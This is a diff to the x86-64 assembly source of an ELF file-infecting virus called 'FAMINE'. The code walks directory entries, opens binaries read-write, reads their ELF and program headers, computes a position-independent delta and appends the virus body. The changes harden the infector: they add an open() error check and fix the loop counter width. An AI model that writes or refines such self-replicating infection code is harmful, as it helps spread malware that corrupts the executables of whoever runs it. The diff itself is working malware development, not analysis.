@@ -15,6 +15,8 @@
 %define S_IFMT 0xf000
 %define SEEK_END	2
 
+; 0x5623feb8e29e
+
 %define FAMINE_STACK_SIZE 5000
 %define DIRENT_BUFFSIZE 1024
 
@@ -178,11 +180,14 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 		mov rax, SYS_OPEN                          ; open ( dirent->d_name, O_RDWR )
 		syscall
 
+		cmp rax, 0
+		jl _continue_dirent
+
 		mov qword [r15 + 1420], rax                ; save binary fd
 		mov rdi, rax                               ; rax contains fd
 		lea rsi, [r15 + 1300]                      ; rsi = ehdr
 		mov rdx, EHDR_SIZE			               ; ehdr.size
-		mov r10, 0                                 ; read at offset 0
+		xor r10, r10                                ; read at offset 0
 		mov rax, SYS_PREAD64
 		syscall
 
@@ -198,7 +203,7 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 		mov r9, [r15 + 1324]
 		mov [r15 + 1508], r9
 
-		mov byte [r15 + 1484], 0                   ; i = 0, iterate over all ELF program headers
+		mov qword [r15 + 1484], 0             ; i = 0, iterate over all ELF program headers
 		_read_phdr:
 			mov word r9w, [r15 + 1484]
 			cmp word [r15 + 1356], r9w
@@ -248,7 +253,6 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 			.delta:
 				pop rbp
 				sub rbp, .delta
-
 
 		_append_virus:
 			mov rdi, [r15 + 1420]
